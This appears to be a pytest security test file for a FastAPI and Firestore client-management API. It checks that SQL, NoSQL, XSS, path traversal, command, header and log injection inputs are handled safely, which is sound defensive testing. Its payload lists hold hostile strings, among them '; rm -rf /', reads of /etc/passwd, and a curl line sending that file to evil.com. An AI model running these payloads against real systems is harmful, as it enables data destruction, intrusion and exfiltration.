"""
Injection Attack Protection Tests - Phase 2

Security tests focused on preventing injection attacks across the pixel management system.
These tests verify protection against SQL injection, NoSQL injection, XSS, path traversal,
and other injection-based attack vectors.

Security Requirements:
- SQL injection protection in client names and domain inputs
- NoSQL injection protection for Firestore queries
- XSS prevention in user-controlled inputs
- Path traversal protection in file operations
- Command injection prevention
- Template injection protection

Test Categories:
1. SQL injection protection in client names and parameters
2. NoSQL injection protection for Firestore operations
3. XSS prevention in input validation
4. Path traversal protection
5. Command injection prevention
"""

import pytest
from unittest.mock import patch, Mock, AsyncMock
from fastapi import HTTPException
import json
from typing import Dict, Any

from app.schemas import ClientCreate, DomainCreate


class TestSQLInjectionProtection:
    """Test protection against SQL injection attacks."""
    
    @pytest.mark.asyncio
    async def test_client_name_sql_injection_protection(self, test_client, valid_admin_headers):
        """
        CRITICAL: Test SQL injection protection in client names.
        Even though we use Firestore (NoSQL), client names could be used in logging
        or other contexts where SQL injection could be relevant.
        """
        
        # SQL injection payloads to test
        sql_injection_payloads = [
            "'; DROP TABLE clients; --",
            "' OR '1'='1",
            "'; DELETE FROM clients WHERE '1'='1'; --",
            "admin'; INSERT INTO clients (name) VALUES ('hacked'); --",
            "test' UNION SELECT * FROM admin_users; --",
            "'; UPDATE clients SET is_active=false; --",
            "test\\'; DROP DATABASE pixel_management; --",
            "' OR 1=1 LIMIT 1 OFFSET 1; --",
        ]
        
        for payload in sql_injection_payloads:
            client_data = {
                "name": payload,
                "email": "test@example.com",
                "client_type": "ecommerce",
                "owner": "test@example.com",
                "privacy_level": "standard",
                "deployment_type": "shared",
                "features": {"analytics": True}
            }
            
            response = await test_client.post(
                "/api/v1/admin/clients",
                headers=valid_admin_headers,
                json=client_data
            )
            
            # Should either succeed with sanitized input or reject malicious input
            if response.status_code == 201:
                # If accepted, verify the payload was sanitized or stored safely
                response_data = response.json()
                stored_name = response_data["name"]
                
                # The name should be the payload (since we're using Firestore, not SQL)
                # but should not cause any system compromise
                assert stored_name == payload
                
                # Verify the injection didn't affect the response structure
                assert "client_id" in response_data
                assert response_data["email"] == "test@example.com"
                
            elif response.status_code == 422:
                # Input validation rejected the malicious input - this is acceptable
                response_data = response.json()
                assert "detail" in response_data
                
            else:
                # Unexpected response - should not happen
                pytest.fail(f"Unexpected response code {response.status_code} for payload: {payload}")
    
    @pytest.mark.asyncio
    async def test_domain_name_sql_injection_protection(self, test_client, valid_admin_headers):
        """Test SQL injection protection in domain names."""
        
        # First create a client to add domains to
        client_data = {
            "name": "Test Client",
            "email": "test@example.com",
            "client_type": "ecommerce",
            "owner": "test@example.com",
            "privacy_level": "standard",
            "deployment_type": "shared",
            "features": {"analytics": True}
        }
        
        client_response = await test_client.post(
            "/api/v1/admin/clients",
            headers=valid_admin_headers,
            json=client_data
        )
        
        assert client_response.status_code == 201
        client_id = client_response.json()["client_id"]
        
        # Test SQL injection in domain names
        sql_injection_domains = [
            "evil.com'; DROP TABLE domains; --",
            "test.com' OR '1'='1",
            "malicious.com'; INSERT INTO domains VALUES ('hacked.com'); --",
            "domain.com\\'; DELETE FROM clients; --",
        ]
        
        for malicious_domain in sql_injection_domains:
            domain_data = {
                "domain": malicious_domain,
                "is_primary": False
            }
            
            response = await test_client.post(
                f"/api/v1/admin/clients/{client_id}/domains",
                headers=valid_admin_headers,
                json=domain_data
            )
            
            # Should either succeed with sanitized input or reject malicious input
            if response.status_code == 201:
                # If accepted, verify the domain was stored safely
                response_data = response.json()
                assert response_data["domain"] == malicious_domain.lower()
                assert "id" in response_data
                
            elif response.status_code in [400, 422]:
                # Input validation rejected the malicious input - acceptable
                assert "detail" in response.json()
                
            else:
                pytest.fail(f"Unexpected response code {response.status_code} for domain: {malicious_domain}")
    
    def test_client_email_sql_injection_protection(self, patched_firestore_client):
        """Test SQL injection protection in client email fields."""
        from app.schemas import ClientCreate
        
        # SQL injection payloads in email field
        email_injection_payloads = [
            "admin@test.com'; DROP TABLE users; --",
            "test@evil.com' OR 1=1; --",
            "hack'; DELETE FROM clients; --@domain.com",
        ]
        
        for payload in email_injection_payloads:
            try:
                # Test Pydantic validation
                client_create = ClientCreate(
                    name="Test Client",
                    email=payload,
                    client_type="ecommerce",
                    owner="test@example.com",
                    privacy_level="standard",
                    deployment_type="shared",
                    features={"analytics": True}
                )
                
                # If Pydantic accepts it, the email format validation
                # should have cleaned or validated the input
                assert "@" in client_create.email  # Basic email structure preserved
                
            except ValueError as e:
                # Pydantic validation rejected the malicious email - good
                assert "email" in str(e).lower()


class TestNoSQLInjectionProtection:
    """Test protection against NoSQL injection attacks specific to Firestore."""
    
    @pytest.mark.asyncio
    async def test_firestore_query_injection_protection(self, test_client):
        """Test NoSQL injection protection in Firestore queries."""
        
        # NoSQL injection payloads that could affect Firestore queries
        nosql_injection_payloads = [
            {"$ne": None},                    # MongoDB-style injection
            {"$gt": ""},                      # Greater than injection
            {"$regex": ".*"},                 # Regex injection
            {"$where": "this.name == 'admin'"}, # JavaScript injection
            {"$or": [{"name": "admin"}]},     # OR injection
        ]
        
        for payload in nosql_injection_payloads:
            # Try to use injection payload as domain name in config lookup
            try:
                # Convert payload to string representation for URL
                payload_str = json.dumps(payload)
                
                response = await test_client.get(f"/api/v1/config/domain/{payload_str}")
                
                # Should return 404 (domain not found) or 400 (invalid format)
                # Should NOT return sensitive data or cause errors
                assert response.status_code in [400, 404], f"NoSQL injection may have succeeded: {payload}"
                
                if response.status_code == 404:
                    response_data = response.json()
                    assert "not authorized" in response_data["detail"].lower()
                
            except Exception as e:
                # If an exception occurs, it should be a validation error, not a database error
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()
    
    def test_firestore_document_injection_protection(self, mock_firestore_client):
        """Test that Firestore document operations resist injection attacks."""
        
        # Test injection in document IDs
        malicious_doc_ids = [
            "../../../admin_config",
            "../../sensitive_data",
            "null\x00byte_injection",
            "unicode_injection_ñüßÄ",
            "special_chars_!@#$%^&*()",
        ]
        
        for doc_id in malicious_doc_ids:
            try:
                # Attempt to access document with malicious ID
                doc_ref = mock_firestore_client.clients_ref.document(doc_id)
                
                # Document reference should be created without error
                # (Firestore handles special characters safely)
                assert doc_ref is not None
                
                # The document ID should be stored as-is (Firestore is safe)
                # We're testing that no path traversal or injection occurs
                mock_doc = doc_ref.get()
                assert not mock_doc.exists  # Should be empty in mock
                
            except Exception as e:
                # Any exception should be a validation error, not a security issue
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()


class TestXSSProtection:
    """Test protection against Cross-Site Scripting (XSS) attacks."""
    
    @pytest.mark.asyncio
    async def test_client_name_xss_protection(self, test_client, valid_admin_headers):
        """Test XSS protection in client name fields."""
        
        # XSS payloads to test
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "<script>fetch('/admin/delete-all')</script>",
        ]
        
        for payload in xss_payloads:
            client_data = {
                "name": payload,
                "email": "test@example.com", 
                "client_type": "ecommerce",
                "owner": "test@example.com",
                "privacy_level": "standard",
                "deployment_type": "shared",
                "features": {"analytics": True}
            }
            
            response = await test_client.post(
                "/api/v1/admin/clients",
                headers=valid_admin_headers,
                json=client_data
            )
            
            if response.status_code == 201:
                response_data = response.json()
                stored_name = response_data["name"]
                
                # Verify XSS payload is stored but would be safely handled
                # (The API itself doesn't render HTML, but should store safely)
                assert stored_name == payload
                
                # Verify response structure is not compromised
                assert "client_id" in response_data
                assert response_data["email"] == "test@example.com"
                
            elif response.status_code == 422:
                # Input validation rejected the XSS - acceptable
                response_data = response.json()
                assert "detail" in response_data
    
    def test_json_response_xss_protection(self, patched_firestore_client):
        """Test that JSON responses properly escape XSS payloads."""
        import json
        
        xss_payload = "<script>alert('stored_xss')</script>"
        
        # Create a client with XSS payload in name
        client_data = {
            "client_id": "test_xss_client",
            "name": xss_payload,
            "email": "test@example.com",
            "client_type": "ecommerce",
            "owner": "test@example.com",
            "privacy_level": "standard",
            "deployment_type": "shared",
            "is_active": True,
            "created_at": "2024-01-01T00:00:00Z"
        }
        
        # Add to mock Firestore
        patched_firestore_client.clients_ref.add(client_data, "test_xss_client")
        
        # Verify JSON serialization handles XSS payload safely
        serialized = json.dumps(client_data)
        
        # JSON should properly escape the XSS payload
        assert "&lt;script&gt;" in serialized or "<script>" in serialized
        # The key point is that when this JSON is parsed by a browser,
        # it won't execute as JavaScript


class TestPathTraversalProtection:
    """Test protection against path traversal attacks."""
    
    @pytest.mark.asyncio
    async def test_client_id_path_traversal_protection(self, test_client, valid_admin_headers):
        """Test path traversal protection in client ID parameters."""
        
        # Path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",        # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",   # Unicode encoded
        ]
        
        for payload in path_traversal_payloads:
            # Try to access client with path traversal in ID
            response = await test_client.get(
                f"/api/v1/admin/clients/{payload}",
                headers=valid_admin_headers
            )
            
            # Should return 404 (client not found) or 400 (invalid format)
            # Should NOT access files outside the application scope
            assert response.status_code in [400, 404, 422], f"Path traversal may have succeeded: {payload}"
            
            if response.status_code == 404:
                response_data = response.json()
                assert "not found" in response_data["detail"].lower()
    
    def test_domain_path_traversal_protection(self, patched_firestore_client):
        """Test path traversal protection in domain operations."""
        
        # Path traversal in domain names
        traversal_domains = [
            "../admin/config",
            "..\\..\\sensitive\\data",
            "/%2e%2e/%2e%2e/etc/passwd",
            "evil.com/../../secret",
        ]
        
        for domain in traversal_domains:
            # Test that domain storage doesn't allow path traversal
            domain_data = {
                "domain": domain,
                "is_primary": False,
                "created_at": "2024-01-01T00:00:00Z"
            }
            
            # Add to mock database - should store as-is without traversal
            doc_id = f"test_client_{domain.replace('.', '_').replace('/', '_')}"
            
            try:
                patched_firestore_client.domain_index_ref.add(domain_data, doc_id)
                
                # Verify it was stored safely (no actual file system access)
                stored_docs = list(patched_firestore_client.domain_index_ref.stream())
                
                # Should be stored without causing file system traversal
                assert len(stored_docs) >= 0  # Mock should handle it safely
                
            except Exception as e:
                # Should be a validation error, not a file system error
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()


class TestCommandInjectionProtection:
    """Test protection against command injection attacks."""
    
    def test_client_name_command_injection_protection(self, patched_firestore_client):
        """Test command injection protection in client names."""
        
        # Command injection payloads
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "; curl evil.com/steal?data=$(cat /etc/passwd)",
            "&& echo 'hacked' > /tmp/hacked",
            "|| ping -c 10 evil.com",
        ]
        
        for payload in command_injection_payloads:
            client_data = {
                "client_id": "test_cmd_injection",
                "name": f"Test Client {payload}",
                "email": "test@example.com",
                "client_type": "ecommerce",
                "owner": "test@example.com",
                "privacy_level": "standard",
                "deployment_type": "shared",
                "is_active": True
            }
            
            try:
                # Store in mock database
                patched_firestore_client.clients_ref.add(client_data, "test_cmd_injection")
                
                # Verify data was stored without executing commands
                # (In our case, we're not executing any shell commands with user input)
                stored_docs = list(patched_firestore_client.clients_ref.stream())
                assert len(stored_docs) >= 0
                
                # Clean up for next iteration
                patched_firestore_client.clients_ref.clear()
                
            except Exception as e:
                # Should be a validation error, not a command execution error
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()


class TestInputValidationIntegrity:
    """Test overall input validation integrity against injection attacks."""
    
    def test_pydantic_schema_injection_protection(self):
        """Test that Pydantic schemas protect against injection attacks."""
        from app.schemas import ClientCreate, DomainCreate
        
        # Test malicious inputs in ClientCreate schema
        malicious_inputs = {
            "name": "<script>alert('xss')</script>",
            "email": "admin'; DROP TABLE users; --@example.com",
            "client_type": "'; DELETE FROM clients; --",
            "owner": "$(whoami)@evil.com",
            "privacy_level": "../../../etc/passwd",
        }
        
        try:
            client = ClientCreate(
                name=malicious_inputs["name"],
                email="test@example.com",  # Use valid email for this test
                client_type="ecommerce",   # Use valid type
                owner="test@example.com",  # Use valid owner
                privacy_level="standard",  # Use valid privacy level
                deployment_type="shared",
                features={"analytics": True}
            )
            
            # If validation passes, malicious content should be contained
            # within the validated structure
            assert client.name == malicious_inputs["name"]
            assert client.client_type == "ecommerce"  # Should use clean value
            
        except ValueError as e:
            # Pydantic validation rejected malicious input - acceptable
            assert "validation" in str(e).lower() or "invalid" in str(e).lower()
    
    def test_json_payload_injection_protection(self):
        """Test protection against JSON injection attacks."""
        import json
        
        # Malicious JSON payloads
        malicious_json_payloads = [
            '{"name": "test", "evil": {"$ne": null}}',
            '{"name": "test\\"; DROP TABLE clients; --"}',
            '{"name": "test", "injection": "</script><script>alert(\\"xss\\")</script>"}',
        ]
        
        for payload in malicious_json_payloads:
            try:
                # Parse JSON payload
                parsed = json.loads(payload)
                
                # Verify that parsing doesn't cause injection
                # The parsed content should be contained as data structures
                assert isinstance(parsed, dict)
                
                # Verify no code execution occurred during parsing
                if "name" in parsed:
                    assert isinstance(parsed["name"], str)
                
            except json.JSONDecodeError:
                # Invalid JSON rejected - acceptable
                pass
    
    @pytest.mark.asyncio
    async def test_api_endpoint_injection_comprehensive(self, test_client, valid_admin_headers):
        """Comprehensive injection test across multiple API endpoints."""
        
        # Test injection across different endpoints
        injection_payload = "'; DROP TABLE clients; --"
        
        endpoints_to_test = [
            {
                "method": "POST",
                "url": "/api/v1/admin/clients",
                "data": {
                    "name": injection_payload,
                    "email": "test@example.com",
                    "client_type": "ecommerce", 
                    "owner": "test@example.com",
                    "privacy_level": "standard",
                    "deployment_type": "shared",
                    "features": {"analytics": True}
                }
            }
        ]
        
        for endpoint in endpoints_to_test:
            if endpoint["method"] == "POST":
                response = await test_client.post(
                    endpoint["url"],
                    headers=valid_admin_headers,
                    json=endpoint["data"]
                )
            elif endpoint["method"] == "GET":
                response = await test_client.get(
                    endpoint["url"],
                    headers=valid_admin_headers
                )
            
            # Should handle injection safely
            assert response.status_code in [200, 201, 400, 422], f"Injection test failed for {endpoint['url']}"
            
            # Response should have proper structure (not be compromised)
            if response.status_code in [200, 201]:
                response_data = response.json()
                # Basic structure verification
                assert isinstance(response_data, (dict, list))


class TestSecurityHeadersAndResponseIntegrity:
    """Test that responses maintain security integrity under injection attacks."""
    
    @pytest.mark.asyncio 
    async def test_response_headers_injection_protection(self, test_client):
        """Test that injection attacks don't compromise response headers."""
        
        # Try injection in various request contexts
        malicious_values = [
            "evil\r\nX-Injected-Header: malicious",
            "test\nContent-Type: text/html",
            "value\r\nSet-Cookie: admin=true",
        ]
        
        for malicious_value in malicious_values:
            # Test with malicious User-Agent
            headers = {
                "User-Agent": malicious_value,
                "Content-Type": "application/json"
            }
            
            response = await test_client.get("/health", headers=headers)
            
            # Response should be normal
            assert response.status_code == 200
            
            # Response headers should not be compromised
            response_headers = dict(response.headers)
            
            # Check for injected headers
            assert "X-Injected-Header" not in response_headers
            assert not any("malicious" in str(value) for value in response_headers.values())
    
    def test_logging_injection_protection(self, caplog):
        """Test that injection attacks don't compromise application logs."""
        import logging
        from app.auth import log_admin_action
        
        # Test log injection
        malicious_log_values = [
            "normal_action\nFAKE_LOG: ADMIN DELETED ALL DATA",
            "action\r\nERROR: System compromised by user admin",
            "test\n[CRITICAL] Security breach detected",
        ]
        
        with caplog.at_level(logging.INFO):
            for malicious_value in malicious_log_values:
                log_admin_action(
                    action=malicious_value,
                    client_id="test_client",
                    api_key_id="test_key",
                    details="test_details"
                )
        
        # Verify logs don't contain injected content as separate log entries
        log_messages = [record.message for record in caplog.records]
        
        for message in log_messages:
            # Should contain the action but not create separate fake log entries
            assert "ADMIN_AUDIT:" in message
            # The malicious content should be contained within the audit log entry
            assert not message.startswith("FAKE_LOG:")
            assert not message.startswith("ERROR: System compromised")
            assert not message.startswith("[CRITICAL] Security breach")